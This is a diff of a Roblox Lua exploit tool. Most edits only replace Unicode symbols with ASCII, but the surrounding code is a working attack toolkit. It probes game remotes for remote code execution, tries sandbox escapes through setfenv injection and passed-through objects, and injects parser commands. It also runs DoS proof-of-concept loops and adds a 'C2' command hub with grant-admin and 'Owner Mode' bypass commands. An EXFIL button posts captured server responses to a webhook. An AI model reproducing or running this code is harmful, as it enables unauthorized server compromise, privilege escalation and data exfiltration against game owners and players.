-        onProgress("═══ PROBE COMPLETE — NO SINKS FOUND ═══", Color3.fromRGB(55,60,80))
+        onProgress("=== PROBE COMPLETE -- NO SINKS FOUND ===", Color3.fromRGB(55,60,80))
         onProgress("All "..#remotes.." remotes tested. Server uses hardcoded handlers.",
             Color3.fromRGB(55,60,80))
     end
@@ -6657,18 +6657,18 @@ function RCE:exec(code, onResult)
             end
         else
             local ok = pcall(function() RCE.sink:FireServer(p) end)
-            if ok then onResult(true,"Fired — watch terminal for callbacks.") return end
+            if ok then onResult(true,"Fired -- watch terminal for callbacks.") return end
         end
     end
     onResult(false,"All payload formats rejected.")
 end
 
 
--- ═══════════════════════════════════════════════════════════════════════════════
+-- ===============================================================================
 -- VM / INTERPRETER PROBE SYSTEM
 -- Targets: Lua-in-Lua VMs (vIu, FIOne, Yueliang), rigid command parsers,
 --          and any remote that accepts string payloads for dynamic evaluation.
--- ═══════════════════════════════════════════════════════════════════════════════
+-- ===============================================================================
 
 -- Name signatures that suggest a VM, interpreter, or command system
 RCE.VM_NAME_SIGS = {
@@ -6712,20 +6712,20 @@ RCE.VM_STAGE_ESCAPE = {
     -- If a real Roblox object is passed into the sandbox, climb via it
     { id="OBJ_PASSTHROUGH",
       q="if game then return 'FULL_ACCESS:'..tostring(game.PlaceId) end return 'sandboxed'" },
-    -- setfenv injection — if we can replace a function's env
+    -- setfenv injection -- if we can replace a function's env
     { id="SETFENV_INJECT",
       q="local f=function() return game end pcall(setfenv,f,getfenv(0)) local ok,r=pcall(f) return tostring(r)" },
 }
 
 RCE.VM_STAGE_EXECUTE = {
-    -- Post-escape payloads — only sent if escape confirmed
+    -- Post-escape payloads -- only sent if escape confirmed
     "return tostring(game.PlaceId)",
     "return game:GetService('Players'):GetPlayers()[1].Name",
     "return tostring(#game:GetService('Players'):GetPlayers())..' players online'",
 }
 
 RCE.VM_DOS_POC = {
-    -- Controlled stress tests — prove DoS without crashing
+    -- Controlled stress tests -- prove DoS without crashing
     { id="LOOP_POC",
       q="local n=0 for i=1,50000 do n=n+i end return 'LOOP_OK:'..n" },
     { id="MEM_POC",
@@ -6735,7 +6735,7 @@ RCE.VM_DOS_POC = {
 }
 
 RCE.CMD_INJECT_PATTERNS = {
-    -- Command parser injection — tries to chain execution
+    -- Command parser injection -- tries to chain execution
     ":exec return 59483+20394",
     ":run return 59483+20394",
     ":eval 59483+20394",
@@ -6812,7 +6812,7 @@ function RCE:vmProbeConfirm(remote, path, onLog)
         local ret, cb = RCE:vmFire(remote, p, 0.8)
         local confirmed = RCE:vmConfirmsExec(ret) or RCE:vmConfirmsExec(cb)
         if confirmed then
-            onLog("  ✓ EXEC CONFIRMED via "..(type(p)=="string" and p:sub(1,32) or "table"),
+            onLog("  [OK] EXEC CONFIRMED via "..(type(p)=="string" and p:sub(1,32) or "table"),
                 Color3.fromRGB(255,60,80))
             return true, ret or cb
         end
@@ -6830,10 +6830,10 @@ function RCE:vmProbeBoundary(remote, path, onLog)
             and { accessible=true, type=tostring(ret) }
             or  { accessible=false }
         if accessible then
-            onLog("  ! EXPOSED: "..probe.key.." → "..tostring(ret):sub(1,30),
+            onLog("  ! EXPOSED: "..probe.key.." -> "..tostring(ret):sub(1,30),
                 Color3.fromRGB(218,155,40))
         else
-            onLog("  · sandboxed: "..probe.key, Color3.fromRGB(55,60,80))
+            onLog("  . sandboxed: "..probe.key, Color3.fromRGB(55,60,80))
         end
         task.wait(0.1)
     end
@@ -6851,11 +6851,11 @@ function RCE:vmProbeEscape(remote, path, boundary, onLog)
         if ret ~= nil then
             local rs = tostring(ret)
             if rs:find("FULL_ACCESS") or rs:find("userdata") or rs:find("%d%d%d%d") then
-                onLog("  ✓ ESCAPE via "..vec.id..": "..rs:sub(1,50),
+                onLog("  [OK] ESCAPE via "..vec.id..": "..rs:sub(1,50),
                     Color3.fromRGB(255,60,80))
                 return true, vec.id, rs
             else
-                onLog("  · "..vec.id..": "..rs:sub(1,30), Color3.fromRGB(55,60,80))
+                onLog("  . "..vec.id..": "..rs:sub(1,30), Color3.fromRGB(55,60,80))
             end
         end
         task.wait(0.1)
@@ -6870,7 +6870,7 @@ function RCE:vmProbePost(remote, path, escaped, onLog)
         for _, payload in ipairs(RCE.VM_STAGE_EXECUTE) do
             local ret = RCE:vmFire(remote, payload, 1.0)
             if ret ~= nil then
-                onLog("  SERVER→ "..tostring(ret):sub(1,60), Color3.fromRGB(255,60,80))
+                onLog("  SERVER-> "..tostring(ret):sub(1,60), Color3.fromRGB(255,60,80))
                 HTTP:capture("SERVER_RESPONSES","vm_exec_"..os.date("%H%M%S"),
                     { payload=payload, result=tostring(ret), path=path })
             end
@@ -6878,7 +6878,7 @@ function RCE:vmProbePost(remote, path, escaped, onLog)
         end
     end
 
-    -- DoS PoC (always runs — proves vulnerability regardless of escape)
+    -- DoS PoC (always runs -- proves vulnerability regardless of escape)
     onLog("  Running DoS proof-of-concept...", Color3.fromRGB(218,155,40))
     for _, poc in ipairs(RCE.VM_DOS_POC) do
         local t0  = tick()
@@ -6888,7 +6888,7 @@ function RCE:vmProbePost(remote, path, escaped, onLog)
             onLog("  DoS/"..poc.id..": "..tostring(ret):sub(1,40)
                 .." ("..ms.."ms)", Color3.fromRGB(218,155,40))
         else
-            onLog("  DoS/"..poc.id..": timeout @ "..ms.."ms — possible freeze vector",
+            onLog("  DoS/"..poc.id..": timeout @ "..ms.."ms -- possible freeze vector",
                 Color3.fromRGB(255,60,80))
         end
         task.wait(0.2)
@@ -6897,67 +6897,67 @@ end
 
 -- Full staged VM probe
 function RCE:probeVM(remote, path, onLog)
-    onLog("┌─ VM PROBE: "..path:sub(1,48), Color3.fromRGB(0,210,200))
+    onLog("+- VM PROBE: "..path:sub(1,48), Color3.fromRGB(0,210,200))
 
     -- Stage 1
     local execOk, evidence = RCE:vmProbeConfirm(remote, path, onLog)
     if not execOk then
-        onLog("└─ No execution confirmed — skipping.", Color3.fromRGB(55,60,80))
+        onLog("+- No execution confirmed -- skipping.", Color3.fromRGB(55,60,80))
         return false
     end
 
     -- Stage 2
-    onLog("├─ Mapping sandbox boundary...", Color3.fromRGB(218,155,40))
+    onLog("+- Mapping sandbox boundary...", Color3.fromRGB(218,155,40))
     local boundary = RCE:vmProbeBoundary(remote, path, onLog)
 
     -- Stage 3
-    onLog("├─ Attempting sandbox escape...", Color3.fromRGB(218,155,40))
+    onLog("+- Attempting sandbox escape...", Color3.fromRGB(218,155,40))
     local escaped, escapeVec, escapeEvidence = RCE:vmProbeEscape(remote, path, boundary, onLog)
 
     if escaped then
         RCE.sink   = remote
         RCE.path   = path
         RCE.active = true
-        onLog("├─ SANDBOX ESCAPED via "..tostring(escapeVec), Color3.fromRGB(255,60,80))
+        onLog("+- SANDBOX ESCAPED via "..tostring(escapeVec), Color3.fromRGB(255,60,80))
         HTTP:capture("SERVER_RESPONSES","vm_escaped_"..os.date("%H%M%S"), {
             path=path, escape_vector=escapeVec, evidence=escapeEvidence,
             boundary=boundary, timestamp=os.date()
         })
     else
-        onLog("├─ Sandbox held — no escape confirmed.", Color3.fromRGB(55,60,80))
+        onLog("+- Sandbox held -- no escape confirmed.", Color3.fromRGB(55,60,80))
     end
 
     -- Stage 4+5
     RCE:vmProbePost(remote, path, escaped, onLog)
 
-    onLog("└─ VM probe complete.", Color3.fromRGB(0,210,200))
+    onLog("+- VM probe complete.", Color3.fromRGB(0,210,200))
     return true
 end
 
 -- Probe a remote as a command parser
 function RCE:probeParser(remote, path, onLog)
-    onLog("┌─ CMD PARSER PROBE: "..path:sub(1,44), Color3.fromRGB(160,80,255))
+    onLog("+- CMD PARSER PROBE: "..path:sub(1,44), Color3.fromRGB(160,80,255))
     local hits = {}
 
     for _, pattern in ipairs(RCE.CMD_INJECT_PATTERNS) do
         local ret, cb = RCE:vmFire(remote, pattern, 0.6)
         local rs = tostring(ret or cb or "")
         if RCE:vmConfirmsExec(ret) or RCE:vmConfirmsExec(cb) then
-            onLog("  ✓ INJECTION via: "..pattern:sub(1,40), Color3.fromRGB(255,60,80))
+            onLog("  [OK] INJECTION via: "..pattern:sub(1,40), Color3.fromRGB(255,60,80))
             table.insert(hits, pattern)
         elseif rs ~= "" and rs ~= "nil" and #rs > 1 then
-            onLog("  · Response: "..rs:sub(1,50), Color3.fromRGB(218,155,40))
+            onLog("  . Response: "..rs:sub(1,50), Color3.fromRGB(218,155,40))
         end
         task.wait(0.08)
     end
 
     if #hits > 0 then
-        onLog("└─ PARSER INJECTION CONFIRMED: "..#hits.." vector(s)", Color3.fromRGB(255,60,80))
+        onLog("+- PARSER INJECTION CONFIRMED: "..#hits.." vector(s)", Color3.fromRGB(255,60,80))
         HTTP:capture("SERVER_RESPONSES","parser_injection_"..os.date("%H%M%S"),{
             path=path, hits=hits, timestamp=os.date()
         })
     else
-        onLog("└─ Parser appears safe — no injection vectors found.", Color3.fromRGB(55,60,80))
+        onLog("+- Parser appears safe -- no injection vectors found.", Color3.fromRGB(55,60,80))
     end
     return #hits > 0
 end
@@ -6971,9 +6971,9 @@ function RCE:discoverAndProbeVMs(onProgress, onComplete)
     RCE.running = true
 
     onProgress("", nil)
-    onProgress("╔════════════════════════════════════════╗", Color3.fromRGB(0,210,200))
-    onProgress("║  VM / INTERPRETER SCAN  INITIATED      ║", Color3.fromRGB(0,210,200))
-    onProgress("╚════════════════════════════════════════╝", Color3.fromRGB(0,210,200))
+    onProgress("+========================================+", Color3.fromRGB(0,210,200))
+    onProgress("|  VM / INTERPRETER SCAN  INITIATED      |", Color3.fromRGB(0,210,200))
+    onProgress("+========================================+", Color3.fromRGB(0,210,200))
 
     local roots = {
         game:GetService("ReplicatedStorage"),
@@ -7020,7 +7020,7 @@ function RCE:discoverAndProbeVMs(onProgress, onComplete)
     local parserHits = 0
 
     for _, cand in ipairs(candidates) do
-        onProgress("Sig ["..cand.sig.."] → "..cand.path:sub(1,50),
+        onProgress("Sig ["..cand.sig.."] -> "..cand.path:sub(1,50),
             Color3.fromRGB(80,140,220))
 
         -- Try VM probe first
@@ -7037,7 +7037,7 @@ function RCE:discoverAndProbeVMs(onProgress, onComplete)
     end
 
     onProgress("", nil)
-    onProgress("═══ VM SCAN COMPLETE ═══", Color3.fromRGB(0,210,200))
+    onProgress("=== VM SCAN COMPLETE ===", Color3.fromRGB(0,210,200))
     onProgress("VM/interpreter hits: "..vmHits.."  |  Parser hits: "..parserHits,
         Color3.fromRGB(0,210,200))
 
@@ -7045,7 +7045,7 @@ function RCE:discoverAndProbeVMs(onProgress, onComplete)
     if onComplete then onComplete(vmHits > 0 or parserHits > 0) end
 end
 
--- ─── C2 CONTROL SURFACE ──────────────────────────────────────────────────────
+-- --- C2 CONTROL SURFACE ------------------------------------------------------
 -- Module-level state (persists across tab switches)
 local c2Status       = "OFFLINE"
 local c2Target       = nil
@@ -7081,7 +7081,7 @@ local C2_COL = {
     INFO       = Color3.fromRGB(218, 160,  48),
 }
 
--- ── Append a line to the terminal ────────────────────────────────────────────
+-- -- Append a line to the terminal --------------------------------------------
 local function c2Log(tag, msg, col)
     if not c2LogScroll then return end
     col = col or C2_COL.SYS
@@ -7123,7 +7123,7 @@ local function c2Log(tag, msg, col)
         math.max(0, totalH - c2LogScroll.AbsoluteSize.Y))
 end
 
--- ── Update status indicator ───────────────────────────────────────────────────
+-- -- Update status indicator ---------------------------------------------------
 local function c2UpdateStatus(status)
     c2Status = status
     local col = C2_COL[status] or C2_COL.OFFLINE
@@ -7150,7 +7150,7 @@ local function c2UpdateStatus(status)
     end
 end
 
--- ── Update session stat labels ────────────────────────────────────────────────
+-- -- Update session stat labels ------------------------------------------------
 local function c2UpdateStats()
     if c2SentLbl    then c2SentLbl.Text    = tostring(c2PacketsSent) end
     if c2RecvLbl    then c2RecvLbl.Text    = tostring(c2PacketsRecv) end
@@ -7163,12 +7163,12 @@ local function c2UpdateStats()
         c2ContactLbl.Text = ago .. "s ago"
         if ago > 15 and c2Status == "ACTIVE" then
             c2UpdateStatus("LOST")
-            c2Log("SYS", "Connection lost — no server signal for "..ago.."s.", C2_COL.ERR)
+            c2Log("SYS", "Connection lost -- no server signal for "..ago.."s.", C2_COL.ERR)
         end
     end
 end
 
--- ── Disconnect ────────────────────────────────────────────────────────────────
+-- -- Disconnect ----------------------------------------------------------------
 local function c2Disconnect()
     for _, conn in ipairs(c2Listeners) do
         pcall(function() conn:Disconnect() end)
@@ -7178,14 +7178,14 @@ local function c2Disconnect()
     c2Target      = nil
     c2UpdateStatus("OFFLINE")
     if c2TargetLbl  then c2TargetLbl.Text  = "none" end
-    if c2SentLbl    then c2SentLbl.Text    = "—" end
-    if c2RecvLbl    then c2RecvLbl.Text    = "—" end
-    if c2TimeLbl    then c2TimeLbl.Text    = "—" end
-    if c2ContactLbl then c2ContactLbl.Text = "—" end
-    c2Log("SYS", "Disconnected — all listeners removed.", C2_COL.SYS)
+    if c2SentLbl    then c2SentLbl.Text    = "--" end
+    if c2RecvLbl    then c2RecvLbl.Text    = "--" end
+    if c2TimeLbl    then c2TimeLbl.Text    = "--" end
+    if c2ContactLbl then c2ContactLbl.Text = "--" end
+    c2Log("SYS", "Disconnected -- all listeners removed.", C2_COL.SYS)
 end
 
--- ── Connect ───────────────────────────────────────────────────────────────────
+-- -- Connect -------------------------------------------------------------------
 local function c2Connect()
     local node, inst = resolveTarget()
     if not node then
@@ -7211,7 +7211,7 @@ local function c2Connect()
 
     if c2TargetLbl then c2TargetLbl.Text = inst.Name end
     c2UpdateStatus("CONNECTING")
-    c2Log("SYS", "Session opened — target: "
+    c2Log("SYS", "Session opened -- target: "
         .. inst.ClassName .. " @ " .. instancePath(inst), C2_COL.SYS)
     c2Log("SYS", "Scanning for RemoteEvents to attach listeners...", C2_COL.SYS)
 
@@ -7239,7 +7239,7 @@ local function c2Connect()
                             if c2Status ~= "ACTIVE" then
                                 c2UpdateStatus("ACTIVE")
                                 c2Log("SYS",
-                                    "Server responding — connection ACTIVE.",
+                                    "Server responding -- connection ACTIVE.",
                                     C2_COL.ACTIVE)
                             end
 
@@ -7259,7 +7259,7 @@ local function c2Connect()
                                 and table.concat(parts, "  |  ")
                                 or "(no args)"
 
-                            c2Log("[←] "..remName, resp, C2_COL.IN)
+                            c2Log("[<-] "..remName, resp, C2_COL.IN)
                             c2UpdateStats()
                         end)
                     end)
@@ -7285,7 +7285,7 @@ local function c2Connect()
     end)
 end
 
--- ── Send a command ────────────────────────────────────────────────────────────
+-- -- Send a command ------------------------------------------------------------
 local function c2Send(label, payload)
     if not c2Target then
         c2Log("!", "Not connected. Press CONNECT first.", C2_COL.ERR)
@@ -7308,7 +7308,7 @@ local function c2Send(label, payload)
     else
         payStr = tostring(payload):sub(1,64)
     end
-    c2Log("[→] "..label, payStr, C2_COL.OUT)
+    c2Log("[->] "..label, payStr, C2_COL.OUT)
 
     local ok, result = pcall(function()
         if c2Target.ClassName == "RemoteEvent" then
@@ -7324,7 +7324,7 @@ local function c2Send(label, payload)
     if not ok then
         c2Log("!", "Server error: "..tostring(result):sub(1,72), C2_COL.ERR)
     elseif result ~= nil then
-        -- RemoteFunction returned immediately — log it
+        -- RemoteFunction returned immediately -- log it
         local resStr
         if type(result) == "table" then
             local jOk, j = pcall(function()
@@ -7337,13 +7337,13 @@ local function c2Send(label, payload)
         c2PacketsRecv = c2PacketsRecv + 1
         c2LastContact = tick()
         if c2Status ~= "ACTIVE" then c2UpdateStatus("ACTIVE") end
-        c2Log("[←] RETURN", resStr, C2_COL.IN)
+        c2Log("[<-] RETURN", resStr, C2_COL.IN)
     end
 
     c2UpdateStats()
 end
 
--- ── C2 state table (presets + categories in one local to save variable slot) ──
+-- -- C2 state table (presets + categories in one local to save variable slot) --
 local C2 = {}
 C2.presets = {
     { label="PING",        col=C2_COL.SYS,
@@ -7365,7 +7365,7 @@ C2.presets = {
       payload=nil },  -- nil = run full chain
 }
 
--- ── C2 Command Hub categories ─────────────────────────────────────────────────
+-- -- C2 Command Hub categories -------------------------------------------------
 C2.cats = {
     {
         id  = "EXEC",   label = "EXEC",
@@ -7395,7 +7395,7 @@ C2.cats = {
               p={action="revokeAdmin", target="self"                  } },
             { n="Admin Check",  d="Query the server's current admin state for this session.",
               p={action="checkAdmin",  target="self"                  } },
-            { n="Owner Mode",   d="Set session role to game owner — bypasses all checks.",
+            { n="Owner Mode",   d="Set session role to game owner -- bypasses all checks.",
               p={action="setRole",     role="owner"                   } },
         },
     },
@@ -7481,7 +7481,7 @@ C2.cats = {
     },
 }
 
--- ─── BUILD FUNCTION (C2 v3 — COMMAND HUB) ───────────────────────────────────
+-- --- BUILD FUNCTION (C2 v3 -- COMMAND HUB) -----------------------------------
 local function buildC2Page(page)
     page.ClipsDescendants = true
 
@@ -7506,7 +7506,7 @@ local function buildC2Page(page)
         f.Size=UDim2.new(1,0,0,1) return f
     end
 
-    -- ── STATUS BAR ─────────────────────────────────────────────────────────
+    -- -- STATUS BAR ---------------------------------------------------------
     local hdr = mF(page,0,0,0,HDR_H,Color3.new(0,0,0),T1,9)
     hdr.Size  = UDim2.new(1,0,0,HDR_H)
     mF(hdr,0,0,3,HDR_H,CR,0.0,10)
@@ -7529,10 +7529,10 @@ local function buildC2Page(page)
         b.MouseLeave:Connect(function() b.BackgroundTransparency=T1 end)
         b.MouseButton1Click:Connect(function() task.spawn(cb) end)
     end
-    hdrPill("◉  CONNECT",  GRN,-184,c2Connect)
-    hdrPill("○  DISCONNECT",CR,-90,c2Disconnect)
+    hdrPill("o  CONNECT",  GRN,-184,c2Connect)
+    hdrPill("o  DISCONNECT",CR,-90,c2Disconnect)
 
-    -- ── SPLIT LAYOUT ──────────────────────────────────────────────────────
+    -- -- SPLIT LAYOUT ------------------------------------------------------
     -- Left pane: command hub
     local lp=mF(page,0,HDR_H,PANEL_W,0,Color3.new(0,0,0),T1,9)
     lp.Size=UDim2.new(0,PANEL_W,1,-HDR_H)
@@ -7542,12 +7542,12 @@ local function buildC2Page(page)
     local rp=mF(page,PANEL_W+1,HDR_H,0,0,Color3.new(0,0,0),T1,9)
     rp.Size=UDim2.new(1,-(PANEL_W+1),1,-HDR_H)
 
-    -- ───────────────────────────────────────────────────────────────────────
-    -- LEFT PANE — fixed three-zone layout:
+    -- -----------------------------------------------------------------------
+    -- LEFT PANE -- fixed three-zone layout:
     --   Zone 1 (top, fixed):     category bar + context strip
     --   Zone 2 (middle, flex):   scrollable command list
     --   Zone 3 (bottom, fixed):  command form (inputs + execute)
-    -- ───────────────────────────────────────────────────────────────────────
+    -- -----------------------------------------------------------------------
     local CAT_H    = 56   -- category pills + context strip
     local FORM_H   = 130  -- command input form
     local OB_H2    = 20   -- outbound URL strip
@@ -7556,7 +7556,7 @@ local function buildC2Page(page)
     local BOTTOM_H = FORM_H + OB_H2 + STAT_H  -- 174
     -- Middle zone fills whatever remains
 
-    -- ── ZONE 1: Category bar ─────────────────────────────────────────────
+    -- -- ZONE 1: Category bar ---------------------------------------------
     local catBar=mF(lp,0,0,PANEL_W,CAT_H,Color3.new(0,0,0),T1,10)
     catBar.Size=UDim2.new(1,0,0,CAT_H)
 
@@ -7573,7 +7573,7 @@ local function buildC2Page(page)
         Enum.Font.Code,8,DIM,Enum.TextXAlignment.Left,11)
     rule(catBar,CAT_H-1,SEP,10)
 
-    -- ── ZONE 2: Command list (scrollable, fills middle) ───────────────────
+    -- -- ZONE 2: Command list (scrollable, fills middle) -------------------
     local listSF=Instance.new("ScrollingFrame")
     listSF.Name="CmdList"
     listSF.Size=UDim2.new(1,0,1,-(CAT_H+BOTTOM_H))
@@ -7583,7 +7583,7 @@ local function buildC2Page(page)
     listSF.ScrollBarImageTransparency=0.65
     listSF.CanvasSize=UDim2.fromOffset(0,0) listSF.ZIndex=10 listSF.Parent=lp
 
-    -- ── ZONE 3: Command form (pinned to bottom) ───────────────────────────
+    -- -- ZONE 3: Command form (pinned to bottom) ---------------------------
     local formPane=mF(lp,0,0,PANEL_W,FORM_H,Color3.new(0,0,0),T1,10)
     formPane.Size=UDim2.new(1,0,0,FORM_H)
     formPane.Position=UDim2.new(0,0,1,-(FORM_H+OB_H2+STAT_H))
@@ -7601,7 +7601,7 @@ local function buildC2Page(page)
     formInput.Position=UDim2.fromOffset(8,30)
     formInput.BackgroundColor3=Color3.new(0,0,0)
     formInput.BackgroundTransparency=0.76 formInput.BorderSizePixel=0
-    formInput.Text="" formInput.PlaceholderText="—"
+    formInput.Text="" formInput.PlaceholderText="--"
     formInput.PlaceholderColor3=DIM formInput.TextColor3=PRI
     formInput.Font=Enum.Font.Code formInput.TextSize=9
     formInput.ClearTextOnFocus=false formInput.TextXAlignment=Enum.TextXAlignment.Left
@@ -7615,7 +7615,7 @@ local function buildC2Page(page)
     formInput2.Position=UDim2.fromOffset(8,62)
     formInput2.BackgroundColor3=Color3.new(0,0,0)
     formInput2.BackgroundTransparency=0.76 formInput2.BorderSizePixel=0
-    formInput2.Text="" formInput2.PlaceholderText="—"
+    formInput2.Text="" formInput2.PlaceholderText="--"
     formInput2.PlaceholderColor3=DIM formInput2.TextColor3=AMB
     formInput2.Font=Enum.Font.Code formInput2.TextSize=9
     formInput2.ClearTextOnFocus=false formInput2.TextXAlignment=Enum.TextXAlignment.Left
@@ -7642,7 +7642,7 @@ local function buildC2Page(page)
         if formExecCB then task.spawn(formExecCB) end
     end)
 
-    -- ── Live game scanner per category ────────────────────────────────────
+    -- -- Live game scanner per category ------------------------------------
     -- Returns a context string and a list of suggestions for input fields
     local function scanContext(catId)
         local ctx = ""
@@ -7659,7 +7659,7 @@ local function buildC2Page(page)
                         table.insert(suggestions, v.Name)
                     end
                 end
-                ctx = #parts>0 and table.concat(parts,"  ·  ") or "no leaderstats found"
+                ctx = #parts>0 and table.concat(parts,"  .  ") or "no leaderstats found"
             else
                 ctx = "no leaderstats found"
             end
@@ -7728,22 +7728,22 @@ local function buildC2Page(page)
             end
             ctx = #found>0
                 and ("admin-related remotes: "..table.concat(found,", "):sub(1,55))
-                or "no admin remotes detected — checking session state"
+                or "no admin remotes detected -- checking session state"
 
         elseif catId == "EXEC" then
-            ctx = "fires payload → target remote → server script handler"
+            ctx = "fires payload -> target remote -> server script handler"
         end
 
         return ctx, suggestions
     end
 
-    -- ── Populate form for selected command ────────────────────────────────
+    -- -- Populate form for selected command --------------------------------
     local function selectCommand(cmd, cat, suggestions)
         formTitle.Text      = cmd.n
         formTitle.TextColor3= cat.col
         formDesc.Text       = cmd.d
         formExec.Visible    = true
-        formExecLbl.Text    = "▶  SEND  —  " .. cmd.n
+        formExecLbl.Text    = ">  SEND  --  " .. cmd.n
         formExecLbl.TextColor3 = cat.col
         local stroke = formExec:FindFirstChildOfClass("UIStroke")
         if stroke then stroke.Color = cat.col end
@@ -7835,7 +7835,7 @@ local function buildC2Page(page)
             formInput.TextColor3    = cat.col
             formInput2.Visible      = false
         else
-            -- No input needed — just show description
+            -- No input needed -- just show description
             formInput.Visible  = false
             formInput2.Visible = false
         end
@@ -7873,12 +7873,12 @@ local function buildC2Page(page)
                 pCopy.name = v1 or p.name or ""
             end
 
-            c2Log("[→] "..cat.label, cmd.n..(v1 and ("  ["..v1:sub(1,20).."]") or ""), C2_COL.OUT)
+            c2Log("[->] "..cat.label, cmd.n..(v1 and ("  ["..v1:sub(1,20).."]") or ""), C2_COL.OUT)
             c2Send(cmd.n, pCopy)
         end
     end
 
-    -- ── Build category pills + command list ───────────────────────────────
+    -- -- Build category pills + command list -------------------------------
     local catBtnRefs = {}
     local activeCatId = nil
 
@@ -7931,8 +7931,8 @@ local function buildC2Page(page)
             mL(row,18,0,PANEL_W-72,ROW_H,cmd.n,
                 Enum.Font.GothamBold,8,MID,Enum.TextXAlignment.Left,12)
 
-            -- "›" arrow hint (right)
-            local arr=mL(row,0,0,PANEL_W-20,ROW_H,"›",
+            -- ">" arrow hint (right)
+            local arr=mL(row,0,0,PANEL_W-20,ROW_H,">",
                 Enum.Font.GothamBold,10,DIM,Enum.TextXAlignment.Right,12)
 
             row.MouseEnter:Connect(function()
@@ -7985,10 +7985,10 @@ local function buildC2Page(page)
     -- Default to EXEC
     buildCatList(C2.cats[1])
 
-    -- ── OUTBOUND + SESSION (very bottom, below the form) ──────────────────
+    -- -- OUTBOUND + SESSION (very bottom, below the form) ------------------
     -- Outbound is placed in the header strip area just to the right of target
     -- so it doesn't occupy left-pane vertical space.
-    -- Instead, put a small "⬆" icon in the status bar that opens a config popup.
+    -- Instead, put a small "^" icon in the status bar that opens a config popup.
     -- Actually: keep it compact in left pane ABOVE the form as a single row.
     local obPane=mF(lp,0,0,PANEL_W,OB_H,Color3.new(0,0,0),T1,10)
     obPane.Size=UDim2.fromOffset(PANEL_W,OB_H2)
@@ -8010,7 +8010,7 @@ local function buildC2Page(page)
 
     local exBtn=mBtn(obPane,PANEL_W-58,1,54,OB_H2-2,CR,T1,11)
     mC(exBtn,3) mS(exBtn,CR,0.55,1)
-    mL(exBtn,0,0,54,OB_H2-2,"⬆ EXFIL",Enum.Font.GothamBold,7,CR,Enum.TextXAlignment.Center,12)
+    mL(exBtn,0,0,54,OB_H2-2,"^ EXFIL",Enum.Font.GothamBold,7,CR,Enum.TextXAlignment.Center,12)
     exBtn.MouseEnter:Connect(function() exBtn.BackgroundColor3=CR; exBtn.BackgroundTransparency=0.82 end)
     exBtn.MouseLeave:Connect(function() exBtn.BackgroundTransparency=T1 end)
     exBtn.MouseButton1Click:Connect(function()
@@ -8021,9 +8021,9 @@ local function buildC2Page(page)
             if HTTP.webhookUrl=="" then
                 c2Log("!","No URL configured.",C2_COL.ERR) return
             end
-            c2Log("[→] POST",HTTP.webhookUrl:sub(1,48),C2_COL.OUT)
+            c2Log("[->] POST",HTTP.webhookUrl:sub(1,48),C2_COL.OUT)
             local ok,status,body,ms=HTTP:post(HTTP.webhookUrl,payload)
-            if ok then c2Log("[←] "..status,body:sub(1,50),C2_COL.IN)
+            if ok then c2Log("[<-] "..status,body:sub(1,50),C2_COL.IN)
             else c2Log("!","HTTP error: "..body:sub(1,60),C2_COL.ERR) end
         end)
     end)
@@ -8039,16 +8039,16 @@ local function buildC2Page(page)
     mL(statBar,132,0,22,STAT_H,"RX",Enum.Font.GothamBold,6,DIM,Enum.TextXAlignment.Left,11)
     c2RecvLbl=mL(statBar,132,10,40,12,"0",Enum.Font.Code,10,GRN,Enum.TextXAlignment.Left,11)
     mL(statBar,180,0,40,STAT_H,"LAST",Enum.Font.GothamBold,6,DIM,Enum.TextXAlignment.Left,11)
-    c2ContactLbl=mL(statBar,180,10,80,12,"—",Enum.Font.Code,9,AMB,Enum.TextXAlignment.Left,11)
+    c2ContactLbl=mL(statBar,180,10,80,12,"--",Enum.Font.Code,9,AMB,Enum.TextXAlignment.Left,11)
 
-    -- ── RIGHT PANE: TERMINAL ──────────────────────────────────────────────
+    -- -- RIGHT PANE: TERMINAL ----------------------------------------------
     local tHdr=mF(rp,0,0,0,24,Color3.new(0,0,0),T1,10)
     tHdr.Size=UDim2.new(1,0,0,24)
     rule(tHdr,23,SEP,11)
     mL(tHdr,10,0,100,24,"SIGNAL FEED",Enum.Font.GothamBold,8,DIM,Enum.TextXAlignment.Left,11)
 
     local lx2=106
-    for _,leg in ipairs({{"SYS",C2_COL.SYS},{"→",C2_COL.OUT},{"←",C2_COL.IN},{"!",C2_COL.ERR}}) do
+    for _,leg in ipairs({{"SYS",C2_COL.SYS},{"->",C2_COL.OUT},{"<-",C2_COL.IN},{"!",C2_COL.ERR}}) do
         local lw=#leg[1]*6+8
         mL(tHdr,lx2,0,lw,24,leg[1],Enum.Font.Code,8,leg[2],Enum.TextXAlignment.Left,11)
         lx2=lx2+lw+4
@@ -8080,21 +8080,21 @@ local function buildC2Page(page)
     rule(strip2,0,SEP,11)
     mL(strip2,12,0,60,22,"TX: 0", Enum.Font.Code,8,BLU,Enum.TextXAlignment.Left,11)
     mL(strip2,72,0,60,22,"RX: 0", Enum.Font.Code,8,GRN,Enum.TextXAlignment.Left,11)
-    mL(strip2,132,0,70,22,"LAT: —",Enum.Font.Code,8,AMB,Enum.TextXAlignment.Left,11)
-    local cur2=mL(strip2,0,0,16,22,"▋",Enum.Font.Code,10,CR,Enum.TextXAlignment.Left,11)
+    mL(strip2,132,0,70,22,"LAT: --",Enum.Font.Code,8,AMB,Enum.TextXAlignment.Left,11)
+    local cur2=mL(strip2,0,0,16,22,"|",Enum.Font.Code,10,CR,Enum.TextXAlignment.Left,11)
     cur2.Position=UDim2.new(1,-18,0,0)
     task.spawn(function()
         while true do cur2.TextTransparency=0; task.wait(0.5); cur2.TextTransparency=1; task.wait(0.5) end
     end)
 
     -- Boot log
-    -- ── PROBE ALL button in header ──────────────────────────────────────────
+    -- -- PROBE ALL button in header ------------------------------------------
     -- PROBE ALL button
     local probeBtn = mBtn(hdr,0,(HDR_H-18)/2,82,18,
         Color3.fromRGB(255,60,80),1,10)
     probeBtn.Position = UDim2.new(1,-368,0,(HDR_H-18)/2)
     mS(probeBtn,Color3.fromRGB(255,60,80),0.45,1) mC(probeBtn,3)
-    local probeLbl=mL(probeBtn,0,0,82,18,"⚡ PROBE ALL",
+    local probeLbl=mL(probeBtn,0,0,82,18,"** PROBE ALL",
         Enum.Font.GothamBold,7,Color3.fromRGB(255,60,80),
         Enum.TextXAlignment.Center,11)
 
@@ -8103,7 +8103,7 @@ local function buildC2Page(page)
         Color3.fromRGB(0,210,200),1,10)
     vmBtn.Position = UDim2.new(1,-280,0,(HDR_H-18)/2)
     mS(vmBtn,Color3.fromRGB(0,210,200),0.45,1) mC(vmBtn,3)
-    local vmLbl=mL(vmBtn,0,0,82,18,"🔍 SCAN VMs",
+    local vmLbl=mL(vmBtn,0,0,82,18,"[search] SCAN VMs",
